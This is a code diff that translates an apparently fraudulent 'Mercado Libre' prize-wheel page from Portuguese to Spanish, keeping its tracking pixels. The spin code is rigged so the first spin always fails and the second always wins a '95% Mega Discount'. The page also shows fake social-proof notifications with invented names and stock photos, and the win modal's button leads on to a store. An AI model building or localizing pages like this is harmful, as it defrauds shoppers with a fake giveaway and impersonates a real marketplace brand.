@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="es-MX">
 <head>
 
 <!-- Google tag (gtag.js) -->
@@ -14,7 +14,7 @@
 <script src="/js/api-base.js"></script><script src="/js/fb-pixel.js"></script><script src="/js/tiktok-pixel.js"></script><script src="/js/utmify-pixel.js"></script><script src="/js/visit-log.js" defer></script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-  <title>Roleta Mercado Livre</title>
+  <title>Ruleta Mercado Libre</title>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -303,9 +303,9 @@
     <div class="wheel-inner pulsing" id="wheel-inner">
       <img class="wheel-img" id="wheel-img"
            src="/images/roleta.png"
-           alt="Roleta">
-      <button class="gire-btn pulsing" id="gire-btn" onclick="spinWheel()" aria-label="Girar roleta">
-        <img src="/images/botao-gire.png" alt="Gire">
+           alt="Ruleta">
+      <button class="gire-btn pulsing" id="gire-btn" onclick="spinWheel()" aria-label="Girar ruleta">
+        <img src="/images/botao-gire.png" alt="Gira">
       </button>
     </div>
   </div>
@@ -313,7 +313,7 @@
   <!-- BOTÃO GIRE PARA GANHAR -->
   <div class="spin-btn-wrapper">
     <button class="btn-spin pulsing" id="btn-spin" onclick="spinWheel()">
-      GIRE PARA GANHAR
+      GIRA PARA GANAR
     </button>
   </div>
 
@@ -329,14 +329,14 @@
 <div class="modal-overlay" id="modal-retry">
   <div class="modal-box">
     <div class="modal-inner">
-      <h2 class="modal-title">Uma pena!</h2>
+      <h2 class="modal-title">¡Qué lástima!</h2>
       <img class="modal-emoji"
            src="/images/emoji-sweat.png"
            alt="Emoji triste">
       <p class="modal-msg">
-        Você foi o grande selecionado e<br>ganhou <span class="highlight-red">01</span> chance extra. Boa sorte!
+        Fuiste el gran seleccionado y<br>ganaste <span class="highlight-red">01</span> oportunidad extra. ¡Buena suerte!
       </p>
-      <button class="btn-modal" onclick="closeRetryModal()">Tentar Novamente</button>
+      <button class="btn-modal" onclick="closeRetryModal()">Intentar de Nuevo</button>
     </div>
   </div>
 </div>
@@ -345,15 +345,15 @@
 <div class="modal-overlay" id="modal-win">
   <div class="modal-box">
     <div class="modal-inner">
-      <h2 class="modal-title">Parabéns!</h2>
+      <h2 class="modal-title">¡Felicidades!</h2>
       <img class="modal-emoji"
            src="/images/emoji-star.png"
-           alt="Emoji estrelas">
+           alt="Emoji estrellas">
       <p class="modal-msg">
-        Você acaba de ganhar o<br>
-        <span class="highlight-green">Mega Desconto de 95%</span>
+        Acabas de ganar el<br>
+        <span class="highlight-green">Mega Descuento de 95%</span>
       </p>
-      <button class="btn-modal" onclick="goToLoja()">Resgatar seu Prêmio</button>
+      <button class="btn-modal" onclick="goToLoja()">Reclamar tu Premio</button>
     </div>
   </div>
 </div>
@@ -362,15 +362,15 @@
   /* ─── NOTIFICAÇÕES ─── */
   const notifications = [
     { name: "Amanda Santos",   photo: "https://i.postimg.cc/tssLM1hF/1.jpg" },
-    { name: "Carlos Oliveira", photo: "https://i.postimg.cc/DJx5rTxB/2.jpg" },
-    { name: "Juliano Costa",   photo: "https://i.postimg.cc/Bjr8kK1F/3.jpg" },
-    { name: "Rafael Almeida", photo: "https://i.postimg.cc/qzf5BkCd/4.jpg" },
-    { name: "Fernanda Lima",   photo: "https://i.postimg.cc/tYqb2CSz/5.jpg" },
-    { name: "Thiago Martins",  photo: "https://i.postimg.cc/x8Wj92sv/11.jpg" },
-    { name: "Gabriela Vieira", photo: "https://i.postimg.cc/njQDM1b0/6.jpg" },
-    { name: "Pedro Henrique",  photo: "https://i.postimg.cc/CR5h7LPq/7.jpg" },
-    { name: "Lucas Ferreira",  photo: "https://i.postimg.cc/GBXBX5rM/8.jpg" },
-    { name: "Maria Silva",     photo: "https://i.postimg.cc/QBgpqbnC/9.jpg" },
+    { name: "Carlos Olivares", photo: "https://i.postimg.cc/DJx5rTxB/2.jpg" },
+    { name: "Julián Acosta",   photo: "https://i.postimg.cc/Bjr8kK1F/3.jpg" },
+    { name: "Rafael Medina", photo: "https://i.postimg.cc/qzf5BkCd/4.jpg" },
+    { name: "Fernanda Lozano",   photo: "https://i.postimg.cc/tYqb2CSz/5.jpg" },
+    { name: "Santiago Martínez",  photo: "https://i.postimg.cc/x8Wj92sv/11.jpg" },
+    { name: "Gabriela Rivera", photo: "https://i.postimg.cc/njQDM1b0/6.jpg" },
+    { name: "Pedro Hernández",  photo: "https://i.postimg.cc/CR5h7LPq/7.jpg" },
+    { name: "Lucas Fernández",  photo: "https://i.postimg.cc/GBXBX5rM/8.jpg" },
+    { name: "María Sánchez",     photo: "https://i.postimg.cc/QBgpqbnC/9.jpg" },
   ];
 
   const discounts = ["5%", "75%", "50%", "95%"];
@@ -419,7 +419,7 @@
 
       audioReady = true;
     } catch (e) {
-      console.log("Erro ao inicializar áudio:", e);
+      console.log("Error al inicializar audio:", e);
     }
   }
 
@@ -466,7 +466,7 @@
     const currentSpin = ++spinCount;
     const fullRotations = 8 * 360; // 2880°
 
-    // 1º giro → cair em "Tente outra vez" (45°)
+    // 1º giro → cair em "Intenta otra vez" (45°)
     // 2º giro → cair em "95%" (90°) → adicionar 8×360 + 315 = 3195
     const extra = currentSpin === 1 ? 45 : 315;
     const target = fullRotations + extra;
@@ -499,7 +499,7 @@
     // Libera o segundo giro
     spinBtn.disabled   = false;
     gireBtn.disabled   = false;
-    spinBtn.textContent = "GIRE PARA GANHAR";
+    spinBtn.textContent = "GIRA PARA GANAR";
     setPulsing(true);
   }
 
